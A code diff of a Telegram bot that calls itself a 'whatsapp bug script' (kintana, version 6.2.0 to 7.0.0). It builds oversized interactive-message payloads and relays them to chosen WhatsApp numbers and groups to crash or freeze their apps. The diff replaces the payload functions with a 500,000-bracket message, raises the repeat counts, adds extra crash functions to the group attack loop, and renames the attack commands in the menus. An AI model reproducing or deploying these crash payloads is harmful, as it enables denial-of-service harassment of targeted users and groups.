@@ -520,7 +520,6 @@ async function fetchAndValidateToken() {
       console.log('❌ your bot token is not registered with kintana');
       process.exit(1);
     }
-    // [SECURITY FIX] pemanggilan sakarowr() dihapus (fungsi sudah dihapus)
     initializeBot();
   } catch (error) {
     console.error("error:", error);
@@ -658,171 +657,37 @@ async function delayhard(sock, target) {
 }
 
 async function halonyet(sock, target) {
-    const OPTS = {
-        noSelfSync: true,
-        waitForAck: false
-    };
-    let sent = 0;
-
-    const buffer2 = Buffer.from([0xff, 0, 0, 0x1d]);
-    const buffer3 = Buffer.from([0xff, 0, 0, 0x1e]);
-    const buffer4 = Buffer.from([0xff, 0, 0, 0x1f]);
-    const buffer5 = Buffer.from([0xff, 0, 0, 0x20]);
-
-    const XForwardedFor = Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "\r\n";
-
-    const inflate = function(tag, depth) {
-        let buf = basePayload;
-        for (let i = 0; i < depth; i++) {
-            buf = wrapLd(tag, wrapLd([0xff], buf));
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u0000" },
+          nativeFlowMessage: {
+            buttons: "[".repeat(500000)
+          }
         }
-        return buf;
-    };
-
-    const Obx = (ch, len) => {
-        let res = "";
-        for (let r = 0; r < len; r++) res += ch;
-        return res;
-    };
-
-    const makeMentions = (count) => {
-        const list = [];
-        for (let m = 0; m < count; m++) {
-            list.push(Math.floor(Math.random() * 700000) + "@s.whatsapp.net");
-        }
-        return list;
-    };
-
-    const makeCards = (count) => {
-        const arr = [];
-        for (let c = 0; c < count; c++) arr.push({});
-        return arr;
-    };
-
-    for (let i = 0; i < 20; i++) {
-        try {
-            const messagePayload = {
-                groupStatusMessageV2: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: Obx("\u200C", 50000),
-                                subtitle: "\u200D".repeat(50000),
-                                hasMediaAttachment: false,
-                                width: 0,
-                                height: 0,
-                                bloksWidget: {
-                                    uuid: "\u200C".repeat(50000),
-                                    data: "[".repeat(50001),
-                                    type: "\u0000".repeat(50000),
-                                    fallback: "\u200D".repeat(50000)
-                                }
-                            },
-                            body: {
-                                text: "\u200B".repeat(50000)
-                            },
-                            nativeFlowMessage: {
-                                buttons: "[".repeat(50000)
-                            }
-                        }
-                    }
-                }
-            };
-
-            await sock.relayMessage(target, messagePayload, OPTS);
-            sent++;
-            console.log("bug succses send to target");
-        } catch (e) {
-            console.log("error cuy" + e.message);
-        }
+      }
     }
+  };
+
+  await sock.relayMessage(target, msg, {});
 }
 
-async function halonyetGB(sock, targetgroup) {
-    const OPTS = {
-        noSelfSync: true,
-        waitForAck: false
-    };
-    let sent = 0;
-
-    const buffer2 = Buffer.from([0xff, 0, 0, 0x1d]);
-    const buffer3 = Buffer.from([0xff, 0, 0, 0x1e]);
-    const buffer4 = Buffer.from([0xff, 0, 0, 0x1f]);
-    const buffer5 = Buffer.from([0xff, 0, 0, 0x20]);
-
-    const XForwardedFor = Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "." +
-        Math.floor(Math.random() * 255) + "\r\n";
-
-    const inflate = function(tag, depth) {
-        let buf = basePayload;
-        for (let i = 0; i < depth; i++) {
-            buf = wrapLd(tag, wrapLd([0xff], buf));
+async function halonyetGB(sock, target) {
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u0000" },
+          nativeFlowMessage: {
+            buttons: "[".repeat(500000)
+          }
         }
-        return buf;
-    };
-
-    const Obx = (ch, len) => {
-        let res = "";
-        for (let r = 0; r < len; r++) res += ch;
-        return res;
-    };
-
-    const makeMentions = (count) => {
-        const list = [];
-        for (let m = 0; m < count; m++) {
-            list.push(Math.floor(Math.random() * 700000) + "@s.whatsapp.net");
-        }
-        return list;
-    };
-
-    const makeCards = (count) => {
-        const arr = [];
-        for (let c = 0; c < count; c++) arr.push({});
-        return arr;
-    };
-
-    for (let i = 0; i < 20; i++) {
-        try {
-            const messagePayload = {
-                groupStatusMessageV2: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: Obx("\u200C", 50000),
-                                subtitle: "\u200D".repeat(50000),
-                                hasMediaAttachment: false,
-                                width: 0,
-                                height: 0,
-                                bloksWidget: {
-                                    uuid: "\u200C".repeat(50000),
-                                    data: "[".repeat(50001),
-                                    type: "\u0000".repeat(50000),
-                                    fallback: "\u200D".repeat(50000)
-                                }
-                            },
-                            body: {
-                                text: "\u200B".repeat(50000)
-                            },
-                            nativeFlowMessage: {
-                                buttons: "[".repeat(50000)
-                            }
-                        }
-                    }
-                }
-            };
-
-            await sock.relayMessage(targetgroup, messagePayload, OPTS);
-            sent++;
-            console.log("bug succses send to target");
-        } catch (e) {
-            console.log("error cuy" + e.message);
-        }
+      }
     }
+  };
+
+  await sock.relayMessage(target, msg, {});
 }
 
 async function kitow(sock, targetgroup, ptcp = true) {
@@ -971,7 +836,7 @@ async function bansgc(sock, targetgroup) {
 }
 
 async function bug1(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 10; i++) {
     try {
       await halonyet(sock, target);
       console.log(`bug send to ${target}`);
@@ -982,7 +847,7 @@ async function bug1(sock, target) {
 }
 
 async function bug2(sock, target) {
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 10; i++) {
     try {
       await halonyet(sock, target);
       console.log(`bug send to ${target}`);
@@ -999,7 +864,7 @@ async function bug3(sock, target) {
       await sleep(500);
       await delayhard(sock, target);
       await sleep(500);
-      await crash(sock, target);
+      await halonyet(sock, target);
       await sleep(500);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
@@ -1013,7 +878,7 @@ async function bug4(sock, target) {
     try {
       await delayhard(sock, target);
       await sleep(500);
-      await crash(sock, target);
+      await halonyet(sock, target);
       await sleep(500);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
@@ -1063,22 +928,17 @@ function getkintanaMenu() {
   const privateStatus = activePrivate > 0 ? "on" : "off";
 
   const html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 <p>this is where all whatsapp bug features are listed. please choose the feature you like.</p>
-
-<h3>free spam (os)</h3>
-<table border="2">
-<tr><th>command</th><th>description</th></tr>
-<tr><td><code>/forceyups</code></td><td>force close crash</td></tr>
-<tr><td><code>/forcecuy</code></td><td>force close crash hard</td></tr>
-</table>
 
 <h3>android bug (os)</h3>
 <table border="2">
 <tr><th>command</th><th>description</th></tr>
+<tr><td><code>/delayhard</code></td><td>force close crash</td></tr>
+<tr><td><code>/crashmeow</code></td><td>force close crash hard</td></tr>
 <tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
 <tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
 </table>
@@ -1087,6 +947,7 @@ function getkintanaMenu() {
 <table border="2">
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/groupcrash</code></td><td>blank click group x delay</td></tr>
+<tr><td><code>/delaygroup</code></td><td>delay group x crash</td></tr>
 </table>
 
 <h3>ban group</h3>
@@ -1138,26 +999,26 @@ bot.onText(/\/start/, async (msg) => {
   const greeting = getGreeting();
 
 const html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 
 <h3>${greeting}, ${username.toLowerCase()}</h3>
 
-<p>i am a whatsapp bug script kintana version 6.2.0, created by heysaka.</p>
+<p>i am a whatsapp bug script kintana version 7.0.0, created by heysaka.</p>
 
 <tg-collage>
 <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/3gruokix.jpg"/>
 </tg-collage>
 
-<audio src="https://mp3tourl.com/audio/1791085429557-19441754-103a-412c-b414-bfb86a8dd107.mp3"></audio>
+<audio src="https://files.catbox.moe/1zshn1.mp3"></audio>
 
 <h3>information</h3>
 <table border="2">
   <tr><th>info</th><th>detail</th></tr>
   <tr><td>creator</td><td>heysaka official id</td></tr>
-  <tr><td>version</td><td>6.2.0</td></tr>
+  <tr><td>version</td><td>7.0.0</td></tr>
   <tr><td>special theme</td><td>one piece</td></tr>
   <tr><td>bot name</td><td>kintana</td></tr>
   <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
@@ -1193,9 +1054,9 @@ bot.on("callback_query", async (query) => {
 
         if (query.data === "owner_menu") {
       html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 
 <p>premium and admin access menu, please register to be able to use the bug.</p>
@@ -1245,9 +1106,9 @@ bot.on("callback_query", async (query) => {
 
     else if (query.data === "bug_info") {
       html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 
 <p>before using the bug feature, you must read this first so you don't make a mistake using it.</p>
@@ -1279,9 +1140,9 @@ bot.on("callback_query", async (query) => {
 
     else if (query.data === "all_menu") {
       html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 <p>all menu contains all the features available in this bot.</p>
 
@@ -1335,9 +1196,9 @@ bot.on("callback_query", async (query) => {
 
     else if (query.data === "thanks_to") {
       html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 <table border="2">
 <tr><th>role</th><th>name</th></tr>
@@ -1360,26 +1221,26 @@ bot.on("callback_query", async (query) => {
 
     else if (query.data === "back_to_main") {
       html = `<tg-slideshow>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/dit3soj0.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/hm8tyz69.jpg"/>
-  <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/cka2ybuq.jpg"/>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
 </tg-slideshow>
 
 <h3>${greeting}, ${username.toLowerCase()}</h3>
 
-<p>i am a whatsapp bug script kintana version 6.2.0, created by heysaka.</p>
+<p>i am a whatsapp bug script kintana version 7.0.0, created by heysaka.</p>
 
 <tg-collage>
 <img src="https://ganga--link--ghhzdp9sv8hk.code.run/i/3gruokix.jpg"/>
 </tg-collage>
 
-<audio src="https://mp3tourl.com/audio/1791085429557-19441754-103a-412c-b414-bfb86a8dd107.mp3"></audio>
+<audio src="https://files.catbox.moe/1zshn1.mp3"></audio>
 
 <h3>information</h3>
 <table border="2">
   <tr><th>info</th><th>detail</th></tr>
   <tr><td>creator</td><td>heysaka official id</td></tr>
-  <tr><td>version</td><td>6.2.0</td></tr>
+  <tr><td>version</td><td>7.0.0</td></tr>
   <tr><td>special theme</td><td>one piece</td></tr>
   <tr><td>bot name</td><td>kintana</td></tr>
   <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
@@ -1734,7 +1595,7 @@ async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>target</td><td>${formattedNumber}</td></tr>
 <tr><td>type</td><td>/${commandName}</td></tr>
-<tr><td>script version</td><td>6.2.0</td></tr>
+<tr><td>script version</td><td>7.0.0</td></tr>
 <tr><td>status</td><td>done</td></tr>
 </table>`;
   const replyMarkup = {
@@ -1751,7 +1612,7 @@ async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId
   await sendRichMenu(chatId, html, replyMarkup, replyToMsgId);
 }
 
-bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(delayhard)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -1763,7 +1624,12 @@ bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
 
   if (!match[2]) {
     return sendRichMenu(chatId,
-      `<h3>missing target</h3>
+      `<tg-slideshow>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
+</tg-slideshow>
+<h3>missing target</h3>
 <table border="2">
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>command</td><td>/${commandName}</td></tr>
@@ -1835,7 +1701,7 @@ bot.onText(/\/(forceyups)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(forcecuy)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(crashmeow)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -1847,7 +1713,12 @@ bot.onText(/\/(forcecuy)(?:\s+(.+))?/, async (msg, match) => {
 
   if (!match[2]) {
     return sendRichMenu(chatId,
-      `<h3>missing target</h3>
+      `<tg-slideshow>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
+</tg-slideshow>
+<h3>missing target</h3>
 <table border="2">
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>command</td><td>/${commandName}</td></tr>
@@ -1932,7 +1803,12 @@ bot.onText(/\/(blankclick)(?:\s+(.+))?/, async (msg, match) => {
 
   if (!match[2]) {
     return sendRichMenu(chatId,
-      `<h3>missing target</h3>
+      `<tg-slideshow>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
+</tg-slideshow>
+<h3>missing target</h3>
 <table border="2">
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>command</td><td>/${commandName}</td></tr>
@@ -2017,7 +1893,12 @@ bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
 
   if (!match[2]) {
     return sendRichMenu(chatId,
-      `<h3>missing target</h3>
+      `<tg-slideshow>
+  <img src="https://files.catbox.moe/w7amv8.jpg"/>
+  <img src="https://files.catbox.moe/12084c.jpg"/>
+  <img src="https://files.catbox.moe/izj4nu.jpg"/>
+</tg-slideshow>
+<h3>missing target</h3>
 <table border="2">
 <tr><th>info</th><th>detail</th></tr>
 <tr><td>command</td><td>/${commandName}</td></tr>
@@ -2089,7 +1970,7 @@ bot.onText(/\/(frezehard)(?:\s+(.+))?/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/(forcegb)(?:\s+(.+))?/, async (msg, match) => {
+bot.onText(/\/(delaygroup)(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
@@ -2232,6 +2113,8 @@ bot.onText(/\/(forcegb)(?:\s+(.+))?/, async (msg, match) => {
       try {
         for (let i = 0; i < 20; i++) {
           await Promise.allSettled([
+            kitow(sock, groupJid).catch(() => {}),
+            kicaumania(sock, groupJid).catch(() => {}),
             halonyetGB(sock, groupJid).catch(() => {})
           ]);
           const currentDelay = getCurrentDelay();
@@ -4050,7 +3933,3 @@ bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
     }
   }
 });
-
-// [SECURITY FIX] detectDebugger() & setInterval dihapus.
-// Fungsi itu bikin bot exit random kalau environment memicu debugger flag
-// (biang kerok bot "kerasukan"). Bukan fitur, murni anti-analisis yang merugikan pemilik bot sendiri.
